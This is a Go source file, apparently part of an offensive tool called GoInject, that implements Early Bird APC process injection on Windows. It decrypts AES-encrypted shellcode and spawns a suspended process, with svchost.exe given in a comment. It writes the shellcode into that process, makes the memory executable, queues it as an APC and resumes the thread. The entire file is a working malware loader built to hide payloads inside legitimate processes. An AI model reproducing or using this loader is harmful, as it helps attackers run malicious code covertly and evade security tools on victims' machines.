package techniques

import (
	"encoding/hex"
	"unsafe"
	"GoInject/crypto"
	"golang.org/x/sys/windows"
)

var (
		createProcess = kernel32.MustFindProc("CreateProcessW")
		queueUserAPC = kernel32.MustFindProc("QueueUserAPC")
		
)

func EarlyBirdQueueUserAPC (spawn string, shellcodeEncrypted string, key string){

    plaintext := crypto.DecryptAES(shellcodeEncrypted, key)
	shellcode, _ := hex.DecodeString(string(plaintext))

	//var spawn string = "C:\\Windows\\system32\\svchost.exe"
	spawn16, _ := windows.UTF16PtrFromString(spawn)

	pi := windows.ProcessInformation{}
	si := windows.StartupInfo{}

	windows.CreateProcess(spawn16, nil, nil, nil, true, windows.CREATE_SUSPENDED, nil, nil, &si, &pi)

	size := len(shellcode)
	address, _, _ := virtualAllocEx.Call(uintptr(pi.Process), uintptr(0), uintptr(size), 0x3000, 0x04)

	//copy shellcode
	var outSize uintptr
	writeProcessMemory.Call(uintptr(pi.Process), address, uintptr(unsafe.Pointer(&shellcode[0])), uintptr(size), outSize)

	//change memory permissions
	oldProtect := 0x04
	virtualProtectEx.Call(uintptr(pi.Process), address, uintptr(size), 0x20, uintptr(unsafe.Pointer(&oldProtect)))

	//QueueUserAPC
	queueUserAPC.Call(address, uintptr(pi.Thread), 0)
	
	

	//Resume thread
	windows.ResumeThread(pi.Thread)

	windows.CloseHandle(pi.Process)
	windows.CloseHandle(pi.Thread)

}